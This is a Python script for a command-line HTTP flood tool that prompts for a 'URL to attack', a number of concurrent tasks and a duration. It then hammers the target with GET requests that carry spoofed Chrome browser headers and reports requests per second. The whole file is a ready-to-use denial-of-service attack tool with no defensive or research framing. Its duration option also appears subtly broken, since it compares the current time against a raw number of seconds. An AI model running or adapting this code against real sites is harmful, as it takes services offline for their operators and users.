import time
import copy
import textwrap as tw
import asyncio
import sys
from pathlib import Path
from urllib.parse import urlparse

asyncio.set_event_loop(asyncio.ProactorEventLoop())

if len(sys.argv) >= 2:
    if sys.argv[1] == "install":
        import subprocess
        file = (Path(__file__) / ".." / "requirements.txt").resolve()
        subprocess.run((sys.executable, "-m", "pip", "install", "--user", "-U", "-r", str(file)))
    elif sys.argv[1] == "help":
        print("Commands:")
        print("install - installs dependencies")
    sys.exit()

try:
    import aiohttp
except ModuleNotFoundError:
    print("Please install aiohttp.")

try:
    import brotli
except ImportError:
    brotli = None


INSECURE_BROWSER_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
    "Accept-Encoding": "gzip, deflate", 
    "Accept-Language": "en-US,en;q=0.9", 
    "Upgrade-Insecure-Requests": "1", 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36", 
}
SECURE_BROWSER_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
    "Accept-Encoding": "gzip, deflate, ", 
    "Accept-Language": "en-US,en;q=0.9", 
    "Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"", 
    "Sec-Ch-Ua-Mobile": "?0", 
    "Sec-Ch-Ua-Platform": "\"Windows\"", 
    "Sec-Fetch-Dest": "document", 
    "Sec-Fetch-Mode": "navigate", 
    "Sec-Fetch-Site": "none", 
    "Sec-Fetch-User": "?1", 
    "Upgrade-Insecure-Requests": "1", 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36", 
}


def get_input(prompt=None, *, func=str, func_name=None):
    while True:
        x = input(prompt)
        try:
            return func(x)
        except Exception:
            fn = func_name or func.__class__.__name__
            print("Failed to convert input to expected type %r. Try again." % fn)


start_event = asyncio.Event()
sent_requests = 0


def shorten(text: str, max_length: int):
    if len(text) > max_length:
        return text[:max_length-3] + "..."
    return text


async def counter_task():
    while True:
        before = copy.copy(sent_requests)
        await asyncio.sleep(1.0)
        after = copy.copy(sent_requests)
        counter = after - before
        print("(RPS)  %s/s" % counter)


async def main_task(target: str, task_id: int, end_at: float = None):
    if end_at is None:
        def end():
            return False
    else:
        def end():
            return time.time() >= end_at
    
    await start_event.wait()
    
    headers = SECURE_BROWSER_HEADERS if target.startswith("https") else INSECURE_BROWSER_HEADERS
    async with aiohttp.ClientSession(headers=headers) as client:
        global sent_requests
        while not end():
            print("({}) <= GET {}".format(str(task_id).zfill(4), target))
            try:
                async with client.get(target) as response:
                    sent_requests += 1
                    print(
                        "({}) => GET {} - {!s} {!s}".format(
                            str(task_id).zfill(4), 
                            shorten(target, 12),
                            response.status,
                            response.reason
                        )
                    )
                    try:
                        await response.content.read(task_id)  # read a few bytes but do nothing with them.
                        # Theoretically, this means that the server will return the payload straight away
                        # Rather than deferring it until the response asks for it.
                        # This way, the server does not discard the data after the requests
                    except Exception:
                        pass
            except RuntimeError:
                return
            except Exception as e:
                print("({}) !! GET {} - Error: {!r}".format(str(task_id).zfill(4), shorten(target, 12), e))


tasks = []


async def main():
    global tasks
    url = is_http = None
    while True:
        url = get_input("URL to attack: ", func=urlparse, func_name="URL")
        if not url.scheme.startswith("http"):
            print("Target must be a http(s) url. Try again.")
        else:
            is_http = url.scheme == "http"
            break
    thread_count = get_input("How many tasks should be started? ", func=int)
    if thread_count < 0 or thread_count >= 10000:
        thread_count = 100
    max_time = get_input("How long, in seconds, should this attack last? (set to 0 to disable) ", func=int) or None
    for i in range(thread_count):
        task = asyncio.ensure_future(
            main_task(
                str(url.geturl()),
                i,
                max_time,
            )
        )
        tasks.append(task)
    
    if brotli is None:
        print("Warning: Websites that serve content compressed with brotli will cause errors.")
        print("You should run `main.py install`.")

    try:
        input("Ready to fire. Just press enter.")
        print("Starting.")
        start_event.set()
        timer_task = asyncio.ensure_future(counter_task())
        await asyncio.gather(*tasks)
        timer_task.cancel()
    except KeyboardInterrupt:
        print("Cancelled.")


loop = asyncio.get_event_loop()
loop.run_until_complete(main())
loop.close()